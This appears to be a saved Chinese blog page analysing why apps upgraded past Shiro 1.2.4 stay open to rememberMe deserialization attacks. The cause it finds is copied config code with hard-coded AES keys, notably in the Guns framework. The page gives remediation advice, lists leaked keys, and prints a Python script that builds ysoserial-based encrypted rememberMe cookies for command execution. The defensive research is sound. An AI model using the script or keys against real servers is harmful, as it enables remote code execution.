@@ -1,0 +1,576 @@
+<!doctype html>
+<html lang="en-us">
+<head>
+
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+
+    <title>关于Shiro反序列化漏洞的延伸升级shiro也能被shell | 开发者问答集锦</title>
+    <meta property="og:title" content="关于Shiro反序列化漏洞的延伸升级shiro也能被shell - 开发者问答集锦">
+    <meta property="og:type" content="article">
+        
+    <meta property="article:published_time" content='2020-09-02T00:00:00&#43;08:00'>
+        
+        
+    <meta property="article:modified_time" content='2020-09-02T00:00:00&#43;08:00'>
+        
+    <meta name="Keywords" content="">
+    <meta name="description" content="关于Shiro反序列化漏洞的延伸升级shiro也能被shell">
+        
+    <meta name="author" content="">
+    <meta property="og:url" content="https://zaina.newban.cn/posts/%E5%85%B3%E4%BA%8Eshiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%BB%B6%E4%BC%B8%E5%8D%87%E7%BA%A7shiro%E4%B9%9F%E8%83%BD%E8%A2%ABshell/">
+    <link rel="shortcut icon" href="/favicon.ico" type="image/x-icon">
+
+    <link rel="stylesheet" href='/css/normalize.css'>
+    <link rel="stylesheet" href='/css/style.css'>
+    <script type="text/javascript" src="//cdn.bootcdn.net/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+
+    
+    
+    
+    
+    
+    
+</head>
+
+
+<body>
+    <header id="header" class="clearfix">
+    <div class="container">
+        <div class="col-group">
+            <div class="site-name ">
+                
+                    <a id="logo" href="https://zaina.newban.cn">
+                        开发者问答集锦
+                    </a>
+                
+                
+            </div>
+            <div>
+                <nav id="nav-menu" class="clearfix">
+                    <a class="" href="https://zaina.newban.cn">首页</a>
+                    
+                </nav>
+            </div>
+        </div>
+    </div>
+</header>
+
+    <div id="body">
+        <div class="container">
+            <div class="col-group">
+
+                <div class="col-8" id="main">
+                    
+<div class="res-cons">
+    
+    <article class="post">
+        <header>
+            <h1 class="post-title">关于Shiro反序列化漏洞的延伸升级shiro也能被shell</h1>
+        </header>
+        <date class="post-meta meta-date">
+            2020年9月2日
+        </date>
+        
+        
+        <div class="post-meta">
+            <span id="busuanzi_container_page_pv">|<span id="busuanzi_value_page_pv"></span><span>
+                    阅读</span></span>
+        </div>
+        
+        
+        <div class="post-content">
+            <p>首先感谢白帽子木板凳，本篇文章是对他提交的一个poc引发的思考。</p>
+
+<p><strong>0x00 概述</strong></p>
+
+<p>第一次接触shiro反序列化漏洞还是16年8月份，距离现在已经很久了，那时候只知道拿着个POC到处打，原理大致看过一下，也没太在意。</p>
+
+<p>但是这次遇到一个问题——某些应用 <strong>“将shiro升级到1.2.4之后的版本,还存在反序列化漏洞”</strong></p>
+
+<p><strong>0x01 事件过程：</strong></p>
+
+<p>开始：</p>
+
+<p>收到到一个漏洞和一段POC，发现是shiro反序列化漏洞。在应急后，让业务去升级shiro到最新的版本，但业务很早之前就升级了。</p>
+
+<p>怀疑：</p>
+
+<p>是不是线上版本和开发版本不同，线上仍然是旧版本的？</p>
+
+<p>是不是pom.xml是修复的版本，但是下载的jar包没有更新？</p>
+
+<p>排查完都不是！</p>
+
+<p>懵逼之后只能去看漏洞原理，排查哪里出了问题。</p>
+
+<p><strong>0x02 漏洞回顾：</strong></p>
+
+<p>这是一直以来比较权威的文章</p>
+
+<blockquote>
+<p><a href="http://blog.knownsec.com/2016/08/apache-shiro-java/">http://blog.knownsec.com/2016/08/apache-shiro-java/</a></p>
+</blockquote>
+
+<p>回顾重点</p>
+
+<pre><code> 
+</code></pre>
+
+<ol>
+<li><p><code>rememberMe cookie</code></p></li>
+
+<li><p><code>CookieRememberMeManager.java</code></p></li>
+
+<li><p><code>Base64</code></p></li>
+
+<li><p><code>AES</code></p></li>
+
+<li><p><code>加密密钥硬编码</code></p></li>
+
+<li><p><code>Java serialization</code></p></li>
+</ol>
+
+<p>大致的逻辑</p>
+
+<pre><code> 
+</code></pre>
+
+<ol>
+<li><p><code>Step1 : cookie里的rememberMe是漏洞的入口</code></p></li>
+
+<li><p><code>Step2 : 将payload AES解密 Base64解码</code></p></li>
+
+<li><p><code>Step3 ：送到问题函数内反序列化-&gt;执行</code></p></li>
+</ol>
+
+<p>官方修复</p>
+
+<p>在SHIRO-550(<a href="https://github.com/Collaborne/shiro/commit/71114398cadb47e49384638df0a4b79fb3120f8a">https://github.com/Collaborne/shiro/commit/71114398cadb47e49384638df0a4b79fb3120f8a</a>)</p>
+
+<p>做了两处修改，实际有作用的是一处，而另外一处是配置文件说明</p>
+
+<p><a href="https://img.it610.com/image/info8/d1784dc526e542e88c147c61551fd6ca.jpg"><img src="https://img.it610.com/image/info8/d1784dc526e542e88c147c61551fd6ca.jpg" alt="关于Shiro反序列化漏洞的延伸—升级shiro也能被shell_第1张图片" /></a>因为CookieRememberMeManager的父类AbstractRememberMeManager中PrincipalCollection
+是序列化的对象，然而这个类是个接口，所以实际的类是SimplePrincipalCollection。（<a href="http://blog.knownsec.com/2016/08/apache-">http://blog.knownsec.com/2016/08/apache-</a>
+shiro-java/）</p>
+
+<p>把问题简单化，就是shiro在处理rememberme 这个Cookie时，弃用了setRememberMeManager(new
+CookieRememberMeManager());有问题代码。</p>
+
+<p><strong>0x03 回到问题：</strong></p>
+
+<p>看完原理，排查存在问题的代码位置，在代码目录下</p>
+
+<pre><code> 
+</code></pre>
+
+<ol>
+<li><code>grep shiro ./* -R</code></li>
+</ol>
+
+<p>找到了位置 文件 shiroConfig.java
+里有一个方法：<a href="https://img.it610.com/image/info8/0e030242d81a4812bdc1c0cfe49d9cbb.jpg"><img src="https://img.it610.com/image/info8/0e030242d81a4812bdc1c0cfe49d9cbb.jpg" alt="" /></a></p>
+
+<p>看一眼import</p>
+
+<pre><code> 
+</code></pre>
+
+<ol>
+<li><code>import org.apache.shiro.web.mgt.DefaultWebSecurityManager;</code></li>
+</ol>
+
+<p>再看下官方修复的路径</p>
+
+<pre><code> 
+</code></pre>
+
+<ol>
+<li><code>web/src/main/java/org/apache/shiro/web/mgt/DefaultWebSecurityManager.java</code></li>
+</ol>
+
+<p>这就是官方删除的那句话，在shiroConfig.java 里 <strong>重写</strong> 了这个方法，也就是说把问题代码又改回去了！！！</p>
+
+<p>再查看下POC里带的Key“Z3VucwAAAAAAAAAAAAAAAA==”<a href="https://img.it610.com/image/info8/22b3449539c640a297d0f7fc2c9160c3.jpg"><img src="https://img.it610.com/image/info8/22b3449539c640a297d0f7fc2c9160c3.jpg" alt="关于Shiro反序列化漏洞的延伸—升级shiro也能被shell_第2张图片" /></a></p>
+
+<p>总结：业务代码里重写了securityManager()这个方法，并且重写成了问题版本，导致的反序列化漏洞。</p>
+
+<p><strong>0x04 问题延伸：</strong></p>
+
+<p>为什么会有这种情况？</p>
+
+<p>可能性1：有其他开源框架整合了shiro，并且有这样一段配置文件，大家就都直接用了。</p>
+
+<p>可能性2：因为这种代码都是互相抄来抄去的，在博客里，教程里，github里有这个代码，开发直接拿过来用。</p>
+
+<p>证实这两种可能性：</p>
+
+<p>将key：Z3VucwAAAAAAAAAAAAAAAA== 放到github当中搜索。</p>
+
+<p>发现大量使用guns框架的代码存在这个问题。我这里受影响的代码也用了这个框架。<a href="https://img.it610.com/image/info8/cd011de512304569871d92cdcfdedd0c.jpg"><img src="https://img.it610.com/image/info8/cd011de512304569871d92cdcfdedd0c.jpg" alt="关于Shiro反序列化漏洞的延伸—升级shiro也能被shell_第3张图片" /></a></p>
+
+<p>得到发现1：guns存在shiro反序列化漏洞</p>
+
+<p>guns是一个整合springmvc + shiro + mybatis-plus + beet的框架。</p>
+
+<p>项目地址：<a href="https://github.com/stylefeng/Guns">https://github.com/stylefeng/Guns</a></p>
+
+<p>问题代码位置：</p>
+
+<blockquote>
+<p><a href="https://github.com/stylefeng/Guns/blob/d2af8b952a8e8f9092b5c10e960b47ad17c72ed3/src/main/java/cn/stylefeng/guns/config/web/ShiroConfig.java">https://github.com/stylefeng/Guns/blob/d2af8b952a8e8f9092b5c10e960b47ad17c72ed3/src/main/java/cn/stylefeng/guns/config/web/ShiroConfig.java</a></p>
+</blockquote>
+
+<p><a href="https://img.it610.com/image/info8/55a96636b9f64c0da886fef6126c54df.png"><img src="https://img.it610.com/image/info8/55a96636b9f64c0da886fef6126c54df.png" alt="关于Shiro反序列化漏洞的延伸—升级shiro也能被shell_第4张图片" /></a><a href="https://img.it610.com/image/info8/1392a3a05fc6419587005b0c44bc7e4e.jpg"><img src="https://img.it610.com/image/info8/1392a3a05fc6419587005b0c44bc7e4e.jpg" alt="关于Shiro反序列化漏洞的延伸—升级shiro也能被shell_第5张图片" /></a></p>
+
+<p>看了下关注和folk的人不少。<a href="https://img.it610.com/image/info8/bf08ae312f13423cb5cda97e855454bb.jpg"><img src="https://img.it610.com/image/info8/bf08ae312f13423cb5cda97e855454bb.jpg" alt="" /></a></p>
+
+<p><a href="https://img.it610.com/image/info8/db4a508c350c45efaff62d508dd21ec8.jpg"><img src="https://img.it610.com/image/info8/db4a508c350c45efaff62d508dd21ec8.jpg" alt="关于Shiro反序列化漏洞的延伸—升级shiro也能被shell_第6张图片" /></a></p>
+
+<p>找到guns之后，研究下ShiroConfig.java的作用，他是用来配置Springboot和shiro整合的配置文件。</p>
+
+<p>得到发现2：springboot springmvc和shiro三者整合的框架也常出现漏洞。</p>
+
+<p>在很多和shiro整合的代码中，配置文件代码，又将存在漏洞的代码复现了。</p>
+
+<pre><code> 
+</code></pre>
+
+<ol>
+<li><p><code>securityManager.setRememberMeManager(rememberMeManager);</code></p></li>
+
+<li><p><code>manager.setCipherKey(Base64.decode(&quot;Z3VucwAAAAAAAAAAAAAAAA==&quot;));</code></p></li>
+</ol>
+
+<p>这两句代码又重出江湖。</p>
+
+<p>其他发现</p>
+
+<p>又将securityManager.setRememberMeManager(rememberMeManager);
+Base64.decode(联合作为关键字到github上搜索发现有1723个结果<a href="https://img.it610.com/image/info8/818e40a0ddd643fe9b1de72ab0453fa7.jpg"><img src="https://img.it610.com/image/info8/818e40a0ddd643fe9b1de72ab0453fa7.jpg" alt="关于Shiro反序列化漏洞的延伸—升级shiro也能被shell_第7张图片" /></a>通过github
+api search接口抓到一些key</p>
+
+<pre><code> 
+</code></pre>
+
+<ol>
+<li><p><code>使用正则大致抓了下key</code></p></li>
+
+<li><p><code>wGiHplamyXlVB11UXWol8g==</code></p></li>
+
+<li><p><code>2AvVhdsgUs0FSA3SDFAdag==</code></p></li>
+
+<li><p><code>4AvVhmFLUs0KTA3Kprsdag==</code></p></li>
+
+<li><p><code>3AvVhmFLUs0KTA3Kprsdag==</code></p></li>
+
+<li><p><code>...</code></p></li>
+</ol>
+
+<p>然后抽取几个key去反查代码,每个key都有不少代码存在于github上，发现了5k+个结果。<a href="https://img.it610.com/image/info8/886b3a889e83482f8637b0c57c4be26a.jpg"><img src="https://img.it610.com/image/info8/886b3a889e83482f8637b0c57c4be26a.jpg" alt="关于Shiro反序列化漏洞的延伸—升级shiro也能被shell_第8张图片" /></a></p>
+
+<p>那百度和google呢？</p>
+
+<p><a href="https://img.it610.com/image/info8/18b4383aaa5a445a8a052657072aecb9.jpg"><img src="https://img.it610.com/image/info8/18b4383aaa5a445a8a052657072aecb9.jpg" alt="关于Shiro反序列化漏洞的延伸—升级shiro也能被shell_第9张图片" /></a>同样很多，有的甚至是教程。</p>
+
+<p>这时 我发现问题还是蛮严重的。</p>
+
+<p>因为错误代码的复用造成的安全问题，扩散程度还是挺大的。</p>
+
+<p><strong>0x05 修复建议</strong></p>
+
+<p>1.将shiro升级到1.2.4之后的版本（1.2.4也是问题版本哦~）</p>
+
+<p>2.在代码仓库中搜索</p>
+
+<pre><code> 
+</code></pre>
+
+<ol>
+<li><p><code>关键字:</code></p></li>
+
+<li><p><code>securityManager.setRememberMeManager(rememberMeManager);+setCipherKey(Base64.decode(&quot;</code></p></li>
+</ol>
+
+<p>排查是否有框架整合了shiro，是否使用了存在漏洞的代码。如果发现请删除securityManager.setRememberMeManager(rememberMeManager);或者修改key，确保key的唯一性。</p>
+
+<p>3.将shiro整理到危险框架名单中，对新业务使用shiro以及响应的整合，需要做安全提示，降低未来存在漏洞的风险。</p>
+
+<p>4.代码审计中添加响应规则，不仅要检测pom.xml中shiro的版本，也要检查代码中是否包含这段官方删除掉的代码。</p>
+
+<p><strong>0x06 扫描脚本改进</strong></p>
+
+<p>来自：<a href="http://blog.knownsec.com/2016/08/apache-shiro-java/">http://blog.knownsec.com/2016/08/apache-shiro-java/</a></p>
+
+<pre><code> 
+</code></pre>
+
+<ol>
+<li><p><code># pip install pycrypto</code></p></li>
+
+<li><p><code>import sys</code></p></li>
+
+<li><p><code>import base64</code></p></li>
+
+<li><p><code>import uuid</code></p></li>
+
+<li><p><code>from random import Random</code></p></li>
+
+<li><p><code>import subprocess</code></p></li>
+
+<li><p><code>from Crypto.Cipher import AES</code></p></li>
+
+<li><ol>
+<li><code>def encode_rememberme(command):</code></li>
+</ol></li>
+
+<li><p><code>popen = subprocess.Popen(['java', '-jar', 'ysoserial-0.0.5-SNAPSHOT-all.jar', 'CommonsCollections2', command], stdout=subprocess.PIPE)</code></p></li>
+
+<li><p><code>BS = AES.block_size</code></p></li>
+
+<li><p><code>pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()</code></p></li>
+
+<li><p><code>key = &quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</code></p></li>
+
+<li><p><code>mode = AES.MODE_CBC</code></p></li>
+
+<li><p><code>iv = uuid.uuid4().bytes</code></p></li>
+
+<li><p><code>encryptor = AES.new(base64.b64decode(key), mode, iv)</code></p></li>
+
+<li><p><code>file_body = pad(popen.stdout.read())</code></p></li>
+
+<li><p><code>base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))</code></p></li>
+
+<li><p><code>return base64_ciphertext</code></p></li>
+
+<li><ol>
+<li><code>if __name__ == '__main__':</code></li>
+</ol></li>
+
+<li><p><code>payload = encode_rememberme(sys.argv[1])</code></p></li>
+
+<li><p><code>with open(&quot;/tmp/payload.cookie&quot;, &quot;w&quot;) as fpw:</code></p></li>
+
+<li><p><code>print(&quot;rememberMe={}&quot;.format(payload.decode()), file=fpw)</code></p></li>
+</ol>
+
+<p>原来的扫描脚本没有太大变化，只需要添加key就可以排查风险了。所以需要抓取key值</p>
+
+<p>Step1:用github 的api search接口，搜索以下关键字</p>
+
+<pre><code> 
+</code></pre>
+
+<ol>
+<li><code>securityManager.setRememberMeManager(rememberMeManager);+setCipherKey(Base64.decode(</code></li>
+</ol>
+
+<p>Step2:用正则匹配key，保存本地</p>
+
+<pre><code> 
+</code></pre>
+
+<ol>
+<li><p><code>wGiHplamyXlVB11UXWol8g==</code></p></li>
+
+<li><p><code>2AvVhdsgUs0FSA3SDFAdag==</code></p></li>
+
+<li><p><code>4AvVhmFLUs0KTA3Kprsdag==</code></p></li>
+
+<li><p><code>3AvVhmFLUs0KTA3Kprsdag==</code></p></li>
+
+<li><p><code>...</code></p></li>
+</ol>
+
+<p><strong>0x07 参考资料</strong></p>
+
+<p><a href="https://www.freebuf.com/vuls/178014.html">https://www.freebuf.com/vuls/178014.html</a></p>
+
+<p><a href="http://blog.knownsec.com/2016/08/apache-shiro-java/">http://blog.knownsec.com/2016/08/apache-shiro-java/</a></p>
+
+<p><a href="http://blog.qianxuefeng.com/article/107">http://blog.qianxuefeng.com/article/107</a></p>
+
+<p><a href="https://blog.zsxsoft.com/post/35">https://blog.zsxsoft.com/post/35</a></p>
+
+<p>欢迎关注技术公众号：架构师成长营</p>
+
+        </div>
+
+        
+
+
+        
+
+<div class="post-archive">
+    <h2>See Also</h2>
+    <ul class="listing">
+        
+        <li><a href="/posts/007hadoop%E9%9B%86%E7%BE%A4%E9%85%8D%E7%BD%AEhadoop%E9%9B%86%E7%BE%A4%E7%9A%84%E5%90%AF%E5%8A%A8%E5%92%8C%E6%B5%8B%E8%AF%95ssh%E5%85%8D%E7%99%BB%E9%99%86%E9%85%8D%E7%BD%AEstartallshhdfs%E5%B8%B8%E7%94%A8%E7%9A%84shell/">007Hadoop集群配置Hadoop集群的启动和测试SSH免登陆配置startallshhdfs常用的shell</a></li>
+        
+        <li><a href="/posts/009shell%E8%84%9A%E6%9C%AC%E4%B8%8B%E6%9D%A1%E4%BB%B6%E6%B5%8B%E8%AF%95eqne/">009Shell脚本下条件测试eqne</a></li>
+        
+        <li><a href="/posts/00pythonmanagepyshell%E5%92%8Cpython%E7%9A%84%E5%88%86%E6%9E%90/">00Pythonmanagepyshell和Python的分析</a></li>
+        
+        <li><a href="/posts/010zookeeper%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5zookeeper%E7%9A%84%E9%9B%86%E7%BE%A4%E6%90%AD%E5%BB%BAzookeeper%E7%9A%84shell%E5%91%BD%E4%BB%A4/">010Zookeeper的基本概念Zookeeper的集群搭建Zookeeper的shell命令</a></li>
+        
+        <li><a href="/posts/018dockerfileshell/">018DockerfileSHELL</a></li>
+        
+    </ul>
+</div>
+
+
+        <div class="post-meta meta-tags">
+            
+            <ul class="clearfix">
+                
+                <li><a href='https://zaina.newban.cn/tags/shell'>shell</a></li>
+                
+            </ul>
+            
+        </div>
+    </article>
+    
+    
+
+    
+    
+</div>
+
+                    <footer id="footer">
+    <div>
+        &copy; 2020 <a href="https://zaina.newban.cn">开发者问答集锦 By </a>
+        
+    </div>
+    <br />
+    <div>
+        <div class="github-badge">
+            <a href="https://gohugo.io/" target="_black" rel="nofollow"><span class="badge-subject">Powered by</span><span class="badge-value bg-blue">Hugo</span></a>
+        </div>
+        <div class="github-badge">
+            <a href="https://www.flysnow.org/" target="_black"><span class="badge-subject">Design by</span><span class="badge-value bg-brightgreen">飞雪无情</span></a>
+        </div>
+        <div class="github-badge">
+            <a href="https://github.com/flysnow-org/maupassant-hugo" target="_black"><span class="badge-subject">Theme</span><span class="badge-value bg-yellowgreen">Maupassant</span></a>
+        </div>
+    </div>
+</footer>
+
+
+    
+    <script type="text/javascript">
+        window.MathJax = {
+            tex2jax: {
+                inlineMath: [['$', '$']],
+                processEscapes: true
+                }
+            };
+    </script>
+    <script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML' async></script>
+
+<a id="rocket" href="#top"></a>
+<script type="text/javascript" src='/js/totop.js?v=0.0.0' async=""></script>
+
+
+
+    <script type="text/javascript" src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script>
+
+
+
+
+                </div>
+
+                <div id="secondary">
+    <section class="widget">
+        <form id="search" action='https://zaina.newban.cn/search/' method="get" accept-charset="utf-8" target="_blank" _lpchecked="1">
+      
+      <input type="text" name="q" maxlength="20" placeholder="Search">
+      <input type="hidden" name="sitesearch" value="https://zaina.newban.cn">
+      <button type="submit" class="submit icon-search"></button>
+</form>
+    </section>
+    
+    <section class="widget">
+        <h3 class="widget-title">最近文章</h3>
+<ul class="widget-list">
+    
+    <li>
+        <a href="https://zaina.newban.cn/posts/001rubyruby%E4%B8%AD%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F%E5%AE%9E%E4%BE%8B%E5%8F%98%E9%87%8F%E5%B1%80%E9%83%A8%E5%8F%98%E9%87%8F%E7%B1%BB%E5%8F%98%E9%87%8Fsymbol%E5%AF%B9%E6%AF%94/" title="001rubyRuby中全局变量实例变量局部变量类变量Symbol对比">001rubyRuby中全局变量实例变量局部变量类变量Symbol对比</a>
+    </li>
+    
+    <li>
+        <a href="https://zaina.newban.cn/posts/007hadoop%E9%9B%86%E7%BE%A4%E9%85%8D%E7%BD%AEhadoop%E9%9B%86%E7%BE%A4%E7%9A%84%E5%90%AF%E5%8A%A8%E5%92%8C%E6%B5%8B%E8%AF%95ssh%E5%85%8D%E7%99%BB%E9%99%86%E9%85%8D%E7%BD%AEstartallshhdfs%E5%B8%B8%E7%94%A8%E7%9A%84shell/" title="007Hadoop集群配置Hadoop集群的启动和测试SSH免登陆配置startallshhdfs常用的shell">007Hadoop集群配置Hadoop集群的启动和测试SSH免登陆配置startallshhdfs常用的shell</a>
+    </li>
+    
+    <li>
+        <a href="https://zaina.newban.cn/posts/009shell%E8%84%9A%E6%9C%AC%E4%B8%8B%E6%9D%A1%E4%BB%B6%E6%B5%8B%E8%AF%95eqne/" title="009Shell脚本下条件测试eqne">009Shell脚本下条件测试eqne</a>
+    </li>
+    
+    <li>
+        <a href="https://zaina.newban.cn/posts/00pythonmanagepyshell%E5%92%8Cpython%E7%9A%84%E5%88%86%E6%9E%90/" title="00Pythonmanagepyshell和Python的分析">00Pythonmanagepyshell和Python的分析</a>
+    </li>
+    
+    <li>
+        <a href="https://zaina.newban.cn/posts/010zookeeper%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5zookeeper%E7%9A%84%E9%9B%86%E7%BE%A4%E6%90%AD%E5%BB%BAzookeeper%E7%9A%84shell%E5%91%BD%E4%BB%A4/" title="010Zookeeper的基本概念Zookeeper的集群搭建Zookeeper的shell命令">010Zookeeper的基本概念Zookeeper的集群搭建Zookeeper的shell命令</a>
+    </li>
+    
+    <li>
+        <a href="https://zaina.newban.cn/posts/018dockerfileshell/" title="018DockerfileSHELL">018DockerfileSHELL</a>
+    </li>
+    
+    <li>
+        <a href="https://zaina.newban.cn/posts/01shell%E5%85%A5%E9%97%A801bashshell%E7%89%B9%E6%80%A7/" title="01Shell入门01bashShell特性">01Shell入门01bashShell特性</a>
+    </li>
+    
+    <li>
+        <a href="https://zaina.newban.cn/posts/01shell%E5%8F%98%E9%87%8F/" title="01Shell变量">01Shell变量</a>
+    </li>
+    
+    <li>
+        <a href="https://zaina.newban.cn/posts/01shell%E5%9F%BA%E7%A1%80%E6%A6%82%E8%BF%B0%E8%84%9A%E6%9C%AC%E6%89%A7%E8%A1%8C%E6%96%B9%E5%BC%8Fbash%E5%9F%BA%E6%9C%AC%E5%8A%9F%E8%83%BD/" title="01Shell基础概述脚本执行方式Bash基本功能">01Shell基础概述脚本执行方式Bash基本功能</a>
+    </li>
+    
+    <li>
+        <a href="https://zaina.newban.cn/posts/01shell%E7%BC%96%E7%A8%8Bhelloworld/" title="01shell编程helloworld">01shell编程helloworld</a>
+    </li>
+    
+</ul>
+    </section>
+
+    
+
+    <section class="widget">
+        <h3 class="widget-title"><a href="/categories">分类</a></h3>
+<ul class="widget-list">
+    
+</ul>
+    </section>
+
+    <section class="widget">
+        <h3 class="widget-title"><a href="/tags">标签</a></h3>
+<div class="tagcloud">
+    
+    <a href="https://zaina.newban.cn/tags/ruby/">ruby</a>
+    
+    <a href="https://zaina.newban.cn/tags/shell/">shell</a>
+    
+</div>
+    </section>
+
+    
+
+    <section class="widget">
+        <h3 class="widget-title">其它</h3>
+        <ul class="widget-list">
+            <li><a href="https://zaina.newban.cn/index.xml">文章 RSS</a></li>
+        </ul>
+    </section>
+</div>
+            </div>
+        </div>
+    </div>
+</body>
+
+</html>
